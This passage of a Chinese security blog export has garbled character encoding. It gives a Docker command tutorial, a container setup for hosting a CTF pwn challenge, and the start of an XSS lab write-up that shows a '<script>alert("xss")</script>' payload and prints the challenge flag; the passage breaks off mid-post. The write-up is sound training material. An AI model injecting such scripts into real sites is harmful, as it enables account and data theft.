è‡ªå·±è§£å†³å§.</p><h2 id="ç¬¬äºŒéƒ¨åˆ†-æŒ‡ä»¤"><a href="#ç¬¬äºŒéƒ¨åˆ†-æŒ‡ä»¤" class="headerlink" title="ç¬¬äºŒéƒ¨åˆ†-æŒ‡ä»¤"></a>ç¬¬äºŒéƒ¨åˆ†-æŒ‡ä»¤</h2><h3 id="å¸¸ç”¨çš„"><a href="#å¸¸ç”¨çš„" class="headerlink" title="å¸¸ç”¨çš„"></a>å¸¸ç”¨çš„</h3><div class="highlight-container" data-rel="Dockerfile"><figure class="iseeu highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">docker version <span class="comment">#æŸ¥çœ‹ç‰ˆæœ¬</span></span><br><span class="line">docker info <span class="comment"># æŸ¥çœ‹ Docker çš„ç³»ç»Ÿä¿¡æ¯ï¼ŒåŒ…æ‹¬å®¹å™¨å’Œé•œåƒæ•°é‡ç­‰</span></span><br><span class="line"></span><br><span class="line">docker build -t &lt;name&gt; . <span class="comment"># åˆ¶ä½œé•œåƒ,æ³¨æ„è¿™é‡Œæœ‰ä¸ªç‚¹</span></span><br><span class="line">docker images <span class="comment"># æŸ¥çœ‹åˆ¶ä½œçš„é•œåƒ</span></span><br><span class="line">docker rmi &lt;id&gt; <span class="comment"># åˆ é™¤æœ¬åœ°é•œåƒ</span></span><br><span class="line"></span><br><span class="line">docker <span class="keyword">run</span><span class="language-bash"> -dit --name &lt;image_name&gt; --<span class="built_in">rm</span> -p 9999:9999 -v $(<span class="built_in">pwd</span>):/app &lt;<span class="built_in">id</span>&gt; <span class="comment"># ä½¿é•œåƒrunèµ·æ¥</span></span></span><br><span class="line">docker ps <span class="comment"># æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„å®¹å™¨</span></span><br><span class="line"></span><br><span class="line">docker search &lt;name&gt; <span class="comment"># åœ¨ Docker Hub ä¸­æœç´¢é•œåƒã€‚</span></span><br><span class="line">docker save -o &lt;file&gt; &lt;image&gt; <span class="comment"># ä¿å­˜é•œåƒåˆ°æœ¬åœ°æ–‡ä»¶ã€‚</span></span><br></pre></td></tr></table></figure></div><h3 id="å®¹å™¨ç®¡ç†"><a href="#å®¹å™¨ç®¡ç†" class="headerlink" title="å®¹å™¨ç®¡ç†"></a>å®¹å™¨ç®¡ç†</h3><table><thead><tr><th>æŒ‡ä»¤</th><th>æè¿°</th></tr></thead><tbody><tr><td><code>docker ps</code></td><td>æŸ¥çœ‹è¿è¡Œä¸­çš„å®¹å™¨åˆ—è¡¨ã€‚</td></tr><tr><td><code>docker ps -a</code></td><td>æŸ¥çœ‹æ‰€æœ‰å®¹å™¨ï¼ˆåŒ…æ‹¬å·²åœæ­¢çš„å®¹å™¨ï¼‰ã€‚</td></tr><tr><td><code>docker run &lt;options&gt; &lt;image&gt;</code></td><td>åˆ›å»ºå¹¶å¯åŠ¨ä¸€ä¸ªå®¹å™¨ã€‚</td></tr><tr><td><code>docker start &lt;container&gt;</code></td><td>å¯åŠ¨å·²åœæ­¢çš„å®¹å™¨ã€‚</td></tr><tr><td><code>docker stop &lt;container&gt;</code></td><td>åœæ­¢è¿è¡Œä¸­çš„å®¹å™¨ã€‚</td></tr><tr><td><code>docker restart &lt;container&gt;</code></td><td>é‡å¯å®¹å™¨ã€‚</td></tr><tr><td><code>docker rm &lt;container&gt;</code></td><td>åˆ é™¤å®¹å™¨ã€‚</td></tr><tr><td><code>docker logs &lt;container&gt;</code></td><td>æŸ¥çœ‹å®¹å™¨çš„æ—¥å¿—è¾“å‡ºã€‚</td></tr><tr><td><code>docker exec -it &lt;container&gt; &lt;command&gt;</code></td><td>åœ¨å®¹å™¨ä¸­è¿è¡Œå‘½ä»¤ï¼ˆäº¤äº’æ¨¡å¼ï¼‰ã€‚</td></tr><tr><td><code>docker attach &lt;container&gt;</code></td><td>é™„åŠ åˆ°å®¹å™¨çš„æ§åˆ¶å°ã€‚</td></tr><tr><td><code>docker kill &lt;container&gt;</code></td><td>å¼ºåˆ¶åœæ­¢å®¹å™¨ã€‚</td></tr></tbody></table><h3 id="å¸¸ç”¨å‚æ•°"><a href="#å¸¸ç”¨å‚æ•°" class="headerlink" title="å¸¸ç”¨å‚æ•°"></a><strong>å¸¸ç”¨å‚æ•°</strong></h3><ul><li><code>-d</code>ï¼šåå°è¿è¡Œå®¹å™¨ï¼ˆ<code>detached</code> æ¨¡å¼ï¼‰ã€‚</li><li><code>-p</code>ï¼šç«¯å£æ˜ å°„ï¼Œä¾‹å¦‚ <code>-p 8080:80</code>ã€‚</li><li><code>-v</code>ï¼šæŒ‚è½½æ•°æ®å·ï¼Œä¾‹å¦‚ <code>-v /host/path:/container/path</code>ã€‚</li><li><code>--name</code>ï¼šä¸ºå®¹å™¨æŒ‡å®šåç§°ã€‚</li><li><code>--rm</code>ï¼šå®¹å™¨é€€å‡ºåè‡ªåŠ¨åˆ é™¤ã€‚</li><li><code>--network</code>ï¼šæŒ‡å®šç½‘ç»œã€‚</li></ul><h3 id="ç¬¬ä¸‰éƒ¨åˆ†-dockerfile"><a href="#ç¬¬ä¸‰éƒ¨åˆ†-dockerfile" class="headerlink" title="ç¬¬ä¸‰éƒ¨åˆ†-dockerfile"></a>ç¬¬ä¸‰éƒ¨åˆ†-dockerfile</h3><p>è¯¥éƒ¨åˆ†è·Ÿç€ä¸‹é¢çš„pwnå‡ºé¢˜ä¸€èµ·è¯´å§</p><h1 id="PWNå‡ºé¢˜"><a href="#PWNå‡ºé¢˜" class="headerlink" title="PWNå‡ºé¢˜"></a>PWNå‡ºé¢˜</h1><h2 id="xinetd"><a href="#xinetd" class="headerlink" title="xinetd"></a>xinetd</h2><p>é¡¹ç›®åœ°å€:<a class="link" href="https://github.com/CTF-Archives/ctf-docker-template">https://github.com/CTF-Archives/ctf-docker-template <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><blockquote><p><strong>ä½¿ç”¨ï¼š</strong></p><p>å°†ç¨‹åºæ–‡ä»¶æ”¾å…¥ <code>./src</code> ç›®å½•å³å¯ï¼Œæ–‡ä»¶åè¯·ä¿®æ”¹ä¸º <code>attachment</code> ä½œä¸ºæ–‡ä»¶åï¼Œä¾¿äºé•œåƒå®šä½ç¨‹åºä½ç½®</p><p>å¦‚æœéœ€è¦æ›´æ”¹ä¸ºè‡ªå·±çš„æ–‡ä»¶åï¼Œéœ€è¦åœ¨ <code>./config/ctf.xinetd</code>ã€<code>./Dockerfile</code> å’Œ <code>./service/docker-entrypoint.sh</code> ä¸­è¿›è¡Œä¿®æ”¹</p></blockquote><ul><li>ç›¸å…³ä½¿ç”¨é¡¹ç›®ä¸­ä¹Ÿè¯´å¾—æ¯”è¾ƒæ¸…æ¥š,æ¯”å¦‚è¯´æˆ‘ä»¬è¦å‡ºä¸€ä¸ªubuntu18.04ç¯å¢ƒä¸‹çš„é¢˜ç›®,é‚£ä¹ˆè¿›å…¥åˆ°è¯¥é¡¹ç›®çš„ubuntu18.04çš„ç›®å½•ä¸‹,å°†æˆ‘ä»¬çš„ç¨‹åºæ”¾å…¥åˆ°srcçš„ç›®å½•ä¸‹å³å¯,æ³¨æ„ç¨‹åºåå­—è®¾ç½®ä¸º<code>attachment</code>,å¦‚æœè¦æ›´æ”¹çš„è¯è¦ä¿®æ”¹ä¸‹é¢çš„åœ°æ–¹:</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241203134003018.bmp"></p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241203134029019.bmp"></p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241203134131216.bmp"></p><h2 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h2><ul><li>å°†ä¸€å†™å¥½çš„ä¸”åœ¨ubuntu18.04ä¸‹ç¼–è¯‘å¥½çš„<code>attachment</code>å¯æ‰§è¡Œæ–‡ä»¶,æ”¾å…¥åˆ°.&#x2F;srcé‡Œé¢,ç„¶ååˆ¶ä½œé•œåƒ:</li></ul><div class="highlight-container" data-rel="Dockerfile"><figure class="iseeu highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t ezstack . <span class="comment"># ezstackè‡ªå·±å–å¾—é•œåƒåå­—</span></span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241203135032224.bmp"></p><p>è¿™æ ·ä¾¿æ˜¯åˆ¶ä½œå¥½äº†é•œåƒæ–‡ä»¶,ç„¶åè®©å®ƒrunèµ·æ¥</p><div class="highlight-container" data-rel="Dockerfile"><figure class="iseeu highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="language-bash"> -dit --name ezstack --<span class="built_in">rm</span> -p 9999:9999 -v $(<span class="built_in">pwd</span>):/app 652fe6597d2a</span></span><br></pre></td></tr></table></figure></div><blockquote><p><strong>é€‰é¡¹è¯¦è§£</strong>:</p><ul><li><p>**<code>-d</code>**ï¼šåå°è¿è¡Œå®¹å™¨ï¼ˆdetached æ¨¡å¼ï¼‰ã€‚</p></li><li><p>**<code>-i</code>**ï¼šè®©å®¹å™¨ä¿æŒäº¤äº’çŠ¶æ€ï¼ˆå³ä½¿æ²¡æœ‰ç»ˆç«¯è¿æ¥ï¼‰ã€‚</p></li><li><p>**<code>-t</code>**ï¼šåˆ†é…ä¸€ä¸ªä¼ªç»ˆç«¯ï¼ˆTTYï¼‰ï¼Œé€šå¸¸å’Œ <code>-i</code> ä¸€èµ·ä½¿ç”¨ã€‚</p></li><li><p>**<code>--name ezstack</code>**ï¼šä¸ºå®¹å™¨å‘½åä¸º <code>ezstack</code>ï¼Œæ–¹ä¾¿åç»­æ“ä½œã€‚</p></li><li><p>**<code>--rm</code>**ï¼šå®¹å™¨é€€å‡ºåè‡ªåŠ¨åˆ é™¤ï¼Œç¡®ä¿è¿è¡Œçš„å®¹å™¨ä¸ä¼šå ç”¨å¤šä½™çš„å­˜å‚¨ã€‚</p></li><li><p>**<code>-p 9999:9999</code>**ï¼šå°†ä¸»æœºçš„ <code>9999</code> ç«¯å£æ˜ å°„åˆ°å®¹å™¨çš„ <code>9999</code> ç«¯å£ã€‚è¿™å…è®¸ä»ä¸»æœºè®¿é—®å®¹å™¨çš„æœåŠ¡ã€‚</p></li><li><p><code>-v $(pwd):/app</code></p><p>å°†å½“å‰ç›®å½•æŒ‚è½½åˆ°å®¹å™¨ä¸­çš„ <code>./app</code>ç›®å½•ä¸‹</p><ul><li><code>$(pwd)</code> æ˜¯ä¸»æœºå½“å‰ç›®å½•çš„è·¯å¾„ã€‚</li><li><code>/app</code> æ˜¯å®¹å™¨å†…çš„è·¯å¾„ã€‚<br>æŒ‚è½½åï¼Œä¸»æœºç›®å½•ä¸­çš„æ–‡ä»¶å¯ä»¥ç›´æ¥åœ¨å®¹å™¨å†…è®¿é—®ï¼Œé€‚åˆå¼€å‘å’Œè°ƒè¯•ã€‚</li></ul></li></ul><p><strong><code>652fe6597d2a</code></strong><br>è¿™æ˜¯ä¸€ä¸ªé•œåƒ IDï¼Œè¡¨ç¤ºä½¿ç”¨è¯¥é•œåƒæ¥å¯åŠ¨å®¹å™¨ã€‚é•œåƒ ID é€šå¸¸å¯ä»¥é€šè¿‡ <code>docker images</code> å‘½ä»¤æ‰¾åˆ°ã€‚</p></blockquote><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241203135646366.bmp"></p><p>è¿™æ ·ä¾¿æ˜¯è¯´æ˜è¯¥å®¹å™¨å·²ç»åœ¨è¿è¡Œäº†,å¹¶ä¸”å½±å°„äº†ç«¯å£,ä¸‹é¢æˆ‘ä»¬æ¥æµ‹è¯•ä¸€ä¸‹è¿æ¥ä»¥åŠè„šæœ¬</p><ul><li>è¿æ¥</li></ul><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vz ip 9999 <span class="comment"># ä»…æµ‹è¯•æ˜¯å¦ä¼šè¿æ¥ä¸Š</span></span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241203140003753.bmp"></p><p>å¾ˆæ˜æ˜¾æ˜¯å¸ƒç½®æˆåŠŸäº†,ä¸‹é¢æµ‹è¯•ä¸€ä¸‹è„šæœ¬ï¼š</p><ul><li>è„šæœ¬ï¼š</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241203141138002.bmp"></p><h1 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h1><ul><li><p>ä¸»è¦å…³æ³¨äº<code>Dockerfile</code>,<code>ctf.xinetd</code>,<code>flag.sh</code>,<code>start.sh</code>ã€‚</p></li><li><p>å…³äºè¿™éƒ¨åˆ†è·Ÿå¹³å°æœ‰å…³ï¼Œä¸åŒå¹³å°çš„è¦æ±‚æˆ–è®¸æœ‰ä¸åŒï¼Œè¿™é‡Œè´´ä¸€ä»½å¤©æƒä¿¡å®‰å‡ºé¢˜çš„ä¸€ä»½<code>dockerfile</code></p></li></ul><h2 id="Dockerfile-1"><a href="#Dockerfile-1" class="headerlink" title="Dockerfile:"></a>Dockerfile:</h2><div class="highlight-container" data-rel="Dockerfile"><figure class="iseeu highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">18.04</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot;</span> /etc/apt/sources.list &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get install -y lib32z1 xinetd &amp;&amp; apt-get install -y xinetd build-essential</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> useradd -m ctf</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /home/ctf</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cp</span> -R /lib* /home/ctf &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">cp</span> -R /usr/lib* /home/ctf</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> /home/ctf/dev &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">mknod</span> /home/ctf/dev/null c 1 3 &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">mknod</span> /home/ctf/dev/zero c 1 5 &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">mknod</span> /home/ctf/dev/random c 1 8 &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">mknod</span> /home/ctf/dev/urandom c 1 9 &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> 666 /home/ctf/dev/*</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> /home/ctf/bin &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">cp</span> /bin/sh /home/ctf/bin &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">cp</span> /bin/ls /home/ctf/bin &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">cp</span> /bin/cat /home/ctf/bin &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">cp</span> /usr/bin/timeout /home/ctf/bin</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./ctf.xinetd /etc/xinetd.d/ctf</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./flag.sh /tmp</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./src/attachment /home/ctf</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./flag /home/ctf</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./fake_flag /home/ctf</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./start.sh /home/ctf</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> 777 /tmp/flag.sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># flag initial</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chown</span> -R root:ctf /home/ctf &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> -R 750 /home/ctf &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">touch</span> /home/ctf/flag &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> 744 /home/ctf/flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;Blocked by ctf_xinetd&quot;</span> &gt; /etc/banner_fail</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&#x27;ctf - nproc 1500&#x27;</span> &gt;&gt;/etc/security/limits.conf</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;/etc/init.d/xinetd start; trap : TERM INT; sleep infinity &amp; wait&quot;</span>]</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">9999</span></span><br></pre></td></tr></table></figure></div><h2 id="ctf-xinetd"><a href="#ctf-xinetd" class="headerlink" title="ctf.xinetd"></a>ctf.xinetd</h2><div class="highlight-container" data-rel="Dockerfile"><figure class="iseeu highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">service ctf</span><br><span class="line">&#123;</span><br><span class="line">    disable = no</span><br><span class="line">    socket_type = stream</span><br><span class="line">    protocol    = tcp</span><br><span class="line">    wait        = no</span><br><span class="line">    <span class="keyword">user</span>        = root</span><br><span class="line">    type        = UNLISTED</span><br><span class="line">    port        = <span class="number">9999</span></span><br><span class="line">    bind        = <span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line">    server      = /usr/sbin/chroot</span><br><span class="line">    server_args = --userspec=<span class="number">1000</span>:<span class="number">1000</span> /home/ctf ./attachment</span><br><span class="line">    banner_fail = /etc/banner_fail</span><br><span class="line">    <span class="comment"># safety options</span></span><br><span class="line">    per_source= <span class="number">10</span> <span class="comment"># the maximum instances of this service per source IP address</span></span><br><span class="line">    rlimit_cpu= <span class="number">20</span> <span class="comment"># the maximum number of CPU seconds that the service may use</span></span><br><span class="line">    <span class="comment">#rlimit_as  = 1024M # the Address Space resource limit for the service</span></span><br><span class="line">    <span class="comment">#access_times = 2:00-9:00 12:00-24:00</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h2 id="flag-sh"><a href="#flag-sh" class="headerlink" title="flag.sh"></a>flag.sh</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line">name=`<span class="built_in">basename</span> <span class="variable">$0</span> .sh`</span><br><span class="line">flag=<span class="variable">$TQ_FLAG</span></span><br><span class="line"><span class="keyword">if</span> [ ! -n <span class="string">&quot;<span class="variable">$TQ_FLAG</span>&quot;</span> ] ;<span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Incomplete Parameter!&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$flag</span>&quot;</span> &gt; /home/ctf/flag</span><br><span class="line">    <span class="built_in">chmod</span> 644 /home/ctf/flag</span><br><span class="line">    <span class="built_in">rm</span> -rf /tmp/flag.sh</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></table></figure></div><h2 id="start-sh"><a href="#start-sh" class="headerlink" title="start.sh"></a>start.sh</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># Add your startup script</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$TQ_FLAG</span>&gt;/home/ctf/flag</span><br><span class="line"><span class="built_in">chmod</span> 755 /home/ctf/flag</span><br></pre></td></tr></table></figure></div><h1 id="ä¸Šä¼ GZ-CTF"><a href="#ä¸Šä¼ GZ-CTF" class="headerlink" title="ä¸Šä¼ GZ-CTF"></a>ä¸Šä¼ GZ-CTF</h1><ul><li>è¿™éƒ¨åˆ†ä»¥åæœ‰æ—¶é—´å†å†™å§</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
            <tag> å­¦ä¹ èµ„æ–™ </tag>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS</title>
      <link href="/2024/11/20/XSS/"/>
      <url>/2024/11/20/XSS/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h1><h2 id="ç¬¬äºŒç« -webè¿›é˜¶-XSSé—¯å…³"><a href="#ç¬¬äºŒç« -webè¿›é˜¶-XSSé—¯å…³" class="headerlink" title="[ç¬¬äºŒç«  webè¿›é˜¶]XSSé—¯å…³"></a>[ç¬¬äºŒç«  webè¿›é˜¶]XSSé—¯å…³</h2><p>é¢˜ç›®é“¾æ¥ï¼š[BUUCTFåœ¨çº¿è¯„æµ‹](<a class="link" href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%BA%8C%E7%AB%A0">https://buuoj.cn/challenges#[ç¬¬äºŒç«  <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> webè¿›é˜¶]XSSé—¯å…³)</p><ul><li>æ ¹æ®æç¤ºç›´æ¥å¼€å§‹æ¸¸æˆï¼Œåˆ©ç”¨<code>alert</code>å‡½æ•°å³å¯</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2024-11-20212007.png"></p><h3 id="éé¢„æœŸ"><a href="#éé¢„æœŸ" class="headerlink" title="éé¢„æœŸ"></a>éé¢„æœŸ</h3><p>æ—¢ç„¶çŸ¥é“æ˜¯ä¸ªé—¯å…³æ¸¸æˆï¼Œé‚£æˆ‘ä»¬ç›´æ¥è¯•<code>level</code>å³å¯ï¼Œåˆ°ç¬¬ä¸ƒå…³çš„æ—¶å€™å°±æœ‰flagäº†</p><p><img lazyload src="/images/loading.svg" data-src="/../%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2024-11-20212641.png"></p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n1book&#123;xss_is_so_interesting&#125;</span><br></pre></td></tr></table></figure></div><h3 id="é¢„æœŸ"><a href="#é¢„æœŸ" class="headerlink" title="é¢„æœŸ"></a>é¢„æœŸ</h3><ul><li><strong>ç¬¬ä¸€å…³</strong></li></ul><p>ç›´æ¥åˆ©ç”¨<code>script</code>æ ‡ç­¾åŠ ä¸Š<code>alert</code>å‡½æ•°å³å¯</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241120213054347.bmp"></p><ul><li><strong>ç¬¬äºŒå…³</strong></li></ul><p>ç”¨åŒæ ·çš„æ–¹æ³•å‘ç°æ‰“ä¸é€šäº†ï¼Œäºæ˜¯çœ‹æºä»£ç ,å‘ç°æœ‰ä¸‹é¢ä¸€æ®µåŠ å¯†</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="regexp">/span&gt;&lt;/</span>div&gt;&lt;<span class="regexp">/div&gt;&lt;/</span>div&gt;&lt;<span class="regexp">/div&gt;&lt;/</span>div&gt;&lt;/div&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">if</span>(location.<span class="property">search</span> == <span class="string">&quot;&quot;</span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">location.<span class="property">search</span> = <span class="string">&quot;?username=xss&quot;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">var</span> username = <span class="string">&#x27;xss&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;ccc&#x27;</span>).<span class="property">innerHTML</span>= <span class="string">&quot;Welcome &quot;</span> + <span class="built_in">escape</span>(username);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></div><blockquote><p><strong>åˆ¤æ–­ <code>location.search</code> å‚æ•°</strong>ï¼š</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(location.<span class="property">search</span> == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">    location.<span class="property">search</span> = <span class="string">&quot;?username=xss&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>å¦‚æœ URL ä¸­æ²¡æœ‰æŸ¥è¯¢å‚æ•°ï¼Œè‡ªåŠ¨è¿½åŠ  <code>?username=xss</code>ï¼Œå°† <code>username</code> é»˜è®¤è®¾ç½®ä¸º <code>xss</code>ã€‚</li></ul><p><strong>å˜é‡å£°æ˜</strong>ï¼š</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> username = <span class="string">&#x27;xss&#x27;</span>;</span><br></pre></td></tr></table></figure></div><ul><li>è¿™é‡Œç¡¬ç¼–ç äº†ä¸€ä¸ªå˜é‡ <code>username</code>ï¼Œå€¼ä¸º <code>&#39;xss&#39;</code>ã€‚</li></ul><p><strong>DOM æ“ä½œ</strong>ï¼š</p><div class="highlight-container" 